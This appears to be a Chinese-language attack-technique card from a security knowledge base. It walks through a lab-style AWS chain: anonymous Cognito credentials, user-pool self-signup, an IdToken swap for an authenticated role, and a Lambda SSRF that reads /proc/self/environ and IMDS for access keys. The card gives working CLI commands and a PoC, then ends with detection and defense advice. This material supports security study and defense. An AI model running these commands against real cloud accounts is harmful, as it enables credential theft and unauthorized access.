---
id: cloud-cloud-iam-cognito-unauth-userpool-lambda-ssrf-env
title: Cognito 身份池匿名/用户池开放注册取 AWS 临时凭证：用 Lambda 参数 SSRF 读 /proc/self/environ 获取环境变量 AK/SK
type: scenario
domain: cloud
path: cloud/cloud-iam
technique: cognito-identity-pool-userpool-lambda-ssrf-env
aliases:
- Cognito 身份池未认证
- Cognito 用户池开放注册
- get-credentials-for-identity
- initiate-auth USER_PASSWORD_AUTH
- IdToken logins
- Lambda target SSRF
- /proc/self/environ 读 AK
tags:
- cloud
- aws
- cognito
- iam
- identity-pool
- user-pool
- jwt
- lambda
- ssrf
- credential-leak
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V657
  verified_at: '2026-11-13T06:37:06+08:00'
  notes: 已对照原文核对 Cognito 匿名身份池、用户池注册、IdToken 换凭证与 Lambda target SSRF；原文仅展示请求外部 URL 的 payload，file:// 读 /proc/self/environ 为原文口述的常用后续且无输出，卡内已如实标注并保留 medium
---

## 一句话结论

当 Cognito 身份池允许未认证身份、且用户池开放自助注册时，攻击者可先用 `--no-sign-request` 匿名换取一组低权 AWS 临时凭证（能读部分 S3），再注册任意用户并通过 `initiate-auth` 拿到 IdToken，把它作为 identity pool 的 `logins` 换取已认证角色的临时凭证；若该角色可调用带用户可控 URL 参数的 Lambda（如状态检查函数），即可用 `file:///proc/self/environ` 等 SSRF 读取函数环境变量中的 AK/SK，最终接管更高权限并读取 flag。

## 原理

- **Cognito 身份池的两条入口**：身份池若启用"未认证身份"，任何人可 `cognito-identity get-id` + `get-credentials-for-identity --no-sign-request` 获得映射角色的临时 STS 凭证；若同时启用用户池作为身份提供方，注册用户登录得到的 IdToken 可通过 `--logins "cognito-idp.<region>.amazonaws.com/<userpool-id>=<IdToken>"` 换取"已认证"角色的凭证。
- **用户池自助注册**：启用 sign-up 时，攻击者用自己的邮箱即可创建账号并确认，无需管理员邀请；`initiate-auth --auth-flow USER_PASSWORD_AUTH` 返回 AccessToken/IdToken/RefreshToken，IdToken 的 `iss` 字段直接给出后续 `logins` 所需的 userpool 标识。
- **角色权限面**：身份池映射的 IAM 角色常被授予 S3、Lambda 等业务权限；本例匿名角色可读 `hl-app-images`（S3 中存有 id_rsa），认证角色可 `lambda:ListFunctions/InvokeFunction/GetFunction`。
- **Lambda SSRF**：业务 Lambda 若把 event 中的 `target` 直接交给 `urllib.request.urlopen(target)`，则支持 `http(s)://`、`file://` 等 scheme；`file:///proc/self/environ` 可读出函数进程环境变量（常含 AK/SK、数据库口令），也可访问 169.254.169.254 等内部端点。函数代码可通过 `get-function` 下载 Location 后审计，确认参数是否可控。
- **为什么成立**：Cognito 的这些开关都是"方便开发"的默认/易开配置，与 IAM 角色权限叠加后，匿名访客即可获得真实的云 API 凭证；前端加密/登录保护在此链中不构成边界。

## 触发条件

- 身份池启用未认证身份（或用户池开放注册且身份池接受其作为登录提供方）。
- 映射角色具备可被利用的权限（S3 读、Lambda 调用等），且资源中存有敏感对象或可滥用函数。
- 目标 Lambda 接受用户可控 URL/参数并直接请求（SSRF），或函数环境变量含长期/临时凭据。

## 利用步骤

1. 用身份池 ID 匿名取凭证：`aws cognito-identity get-id --identity-pool-id <pool> --no-sign-request`，再 `get-credentials-for-identity --identity-id <id> --no-sign-request`。
2. 配置临时凭证，枚举权限；本例可读 S3 并下载 `s3://hl-app-images/temp/id_rsa`。
3. 找到用户池 Client ID；`aws cognito-idp sign-up --client-id <client> --username <user> --password <pwd> --user-attributes Name=email,Value=<own-email>`，用收到的验证码 `confirm-sign-up`。
4. `aws cognito-idp initiate-auth --auth-flow USER_PASSWORD_AUTH --client-id <client> --auth-parameters USERNAME=<user>,PASSWORD=<pwd>` 获取 IdToken；解码 JWT 得到 `iss`（`https://cognito-idp.<region>.amazonaws.com/<userpool-id>`）。
5. 用 IdToken 重新取身份池凭证：`get-id ... --logins "<iss>=<IdToken>"`、`get-credentials-for-identity --identity-id <new-id> --logins "<iss>=<IdToken>"`。
6. `aws lambda list-functions` → `get-function --function-name <fn>` 下载代码，审计 `target` 参数；`aws lambda invoke --function-name <fn> --payload <base64({"target":"file:///proc/self/environ"})>` 读取环境变量中的 AK/SK（原文仅展示了请求外部 URL 的 payload，读 env 为该类 SSRF 的常用后续）。
7. 配置泄露的 AK/SK，读取函数代码中引用的日志/业务桶（本例 `hl-status-log-bucket`）取得 flag。

## PoC

```bash
# 1) 匿名身份池凭证
aws cognito-identity get-id --identity-pool-id us-east-1:<pool-id> --no-sign-request
aws cognito-identity get-credentials-for-identity \
  --identity-id us-east-1:<identity-id> --no-sign-request

# 2) 用户池自助注册 + 登录
aws cognito-idp sign-up --client-id <client-id> --username <user> \
  --password '<Password>' --user-attributes Name=email,Value=<email>
aws cognito-idp confirm-sign-up --client-id <client-id> --username <user> --confirmation-code <code>
aws cognito-idp initiate-auth --auth-flow USER_PASSWORD_AUTH --client-id <client-id> \
  --auth-parameters USERNAME=<user>,PASSWORD=<Password>

# 3) 用 IdToken 换已认证角色凭证
aws cognito-identity get-id --identity-pool-id us-east-1:<pool-id> \
  --logins "cognito-idp.us-east-1.amazonaws.com/us-east-1_<pool>=<IdToken>"
aws cognito-identity get-credentials-for-identity --identity-id <new-id> \
  --logins "cognito-idp.us-east-1.amazonaws.com/us-east-1_<pool>=<IdToken>"

# 4) Lambda 审计与 SSRF（payload 为 base64 JSON）
aws lambda list-functions
aws lambda get-function --function-name huge-logistics-status
aws lambda invoke --function-name huge-logistics-status \
  --payload "$(printf '{"target":"file:///proc/self/environ"}' | base64 -w0)" out.txt
```

## 变体与关联

- 变体：未开放注册时，可尝试用户名枚举/弱口令/忘记密码流程拿 IdToken；或直接滥用匿名角色的 S3 权限。
- 变体：Lambda SSRF 目标还包括 `http://169.254.169.254/latest/meta-data/iam/security-credentials/`、内部服务与 `file:///proc/self/environ`；若函数有 VPC 访问，可打内网。
- 关联：[[cloud-metadata-ssrf-imdsv2-token-credential]]（SSRF 打 IMDS 取角色凭证）、[[cloud-cloud-iam-lambda-env-ak-enumerate-secrets-manager]]（Lambda 环境变量 AK 后续利用）、[[cloud-cloud-iam-s3-bucket-name-brute-source-ssm-lambda]]（另一条从 S3 到 Lambda 的凭据链）。

## 检测与防御

- 关闭身份池"未认证身份"；用户池关闭自助注册或加邮箱域/邀请限制；身份池角色严格最小权限（不授予 S3 全桶、Lambda 调用）。
- Lambda 不对用户输入直接 `urlopen`：使用域名白名单、禁止 `file://`/内网地址、单独出网策略；敏感配置放 Secrets Manager 而非环境变量。
- 检测：Cognito 异常注册/登录、身份池 get-credentials 激增；CloudTrail 关注匿名/新身份调用 `InvokeFunction` 与随后 S3 读；Lambda 日志中的 `file://`、`/proc/self/environ`、169.254.169.254 请求。
- 响应：吊销身份池角色会话、清理恶意注册用户、轮换 Lambda 环境凭据并审计 S3 访问。
